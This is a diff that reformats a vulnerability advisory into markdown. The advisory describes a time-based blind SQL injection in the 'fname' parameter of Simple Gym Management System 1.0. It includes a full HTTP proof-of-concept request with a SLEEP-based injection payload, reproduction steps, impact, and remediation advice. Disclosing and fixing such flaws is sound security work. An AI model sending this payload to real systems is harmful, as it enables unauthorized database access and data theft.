@@ -1,21 +1,21 @@
-Time-Based Blind SQL Injection in Simple Gym Management System in PHP
-Product
+## Time-Based Blind SQL Injection in Simple Gym Management System in PHP
+## Product
 
 Simple Gym Management System in PHP
 
-Vendor
+## Vendor
 
 Code-Projects
 
-Vendor URL
+## Vendor URL
 
 https://code-projects.org/simple-gym-management-system-in-php-with-source-code/
 
-Affected Version
+## Affected Version
 
 1.0
 
-Vulnerability Type
+## Vulnerability Type
 
 SQL Injection (Time-Based Blind)
 
@@ -23,11 +23,11 @@ CWE
 
 CWE-89 – Improper Neutralization of Special Elements used in an SQL Command
 
-Severity
+## Severity
 
 High
 
-Description
+## Description
 
 The Simple Gym Management System in PHP 1.0 is vulnerable to Time-Based Blind SQL Injection via the fname parameter handled by the /gym/func.php endpoint. The vulnerability occurs because the application fails to properly validate and sanitize user-supplied input before including it in SQL queries executed by the backend database.
 
@@ -41,14 +41,14 @@ Successful exploitation of this vulnerability could allow attackers to enumerate
 
 The root cause of this issue is the absence of input validation and the lack of parameterized queries when handling user-controlled input within SQL statements.
 
-Affected Endpoint
+## Affected Endpoint
 /gym/func.php
 Vulnerable Parameter
 fname
-Proof of Concept
+## Proof of Concept
 
 The vulnerability can be triggered using the following HTTP request:
-
+```plain
 POST //gym/func.php HTTP/1.1
 Host: localhost
 Content-Length: 204
@@ -72,7 +72,9 @@ Cookie: PHPSESSID=d09ljmgtflh1l4dagc0opvshgr
 Connection: keep-alive
 
 fname=orwa(select(0)from(select(sleep(15)))v)%2f%2a'%2B(select(0)from(select(sleep(15)))v)%2B'%22%2B(select(0)from(select(sleep(15)))v)%2B%22%2a%2f&lname=1&email=1&contact=1&docapp=101&pat_submit=Register
-Steps to Reproduce
+```
+
+## Steps to Reproduce
 
 Install and run the Simple Gym Management System.
 
@@ -86,13 +88,13 @@ Send the request to the server.
 
 Observe the server response time.
 
-Result
+## Result
 
 The server response is delayed by approximately 15 seconds, indicating that the injected SQL statement containing the SLEEP(15) function has been executed by the backend database.
 
 This confirms the presence of a time-based blind SQL injection vulnerability.
 
-Impact
+## Impact
 
 An attacker exploiting this vulnerability may be able to:
 
@@ -108,7 +110,7 @@ Potentially gain administrative access to the system
 
 In severe cases, attackers could fully compromise the application database.
 
-Remediation
+## Remediation
 
 To mitigate this vulnerability, developers should implement the following security practices:
 
@@ -132,7 +134,7 @@ Web Application Firewall
 
 Deploy a Web Application Firewall (WAF) to detect and block SQL injection attempts.
 
-Vulnerability Classification
+## Vulnerability Classification
 
 CWE
 
@@ -142,7 +144,7 @@ OWASP Top 10
 
 A03:2021 – Injection
 
-Reference
+## Reference
 
 https://code-projects.org/simple-gym-management-system-in-php-with-source-code/
 
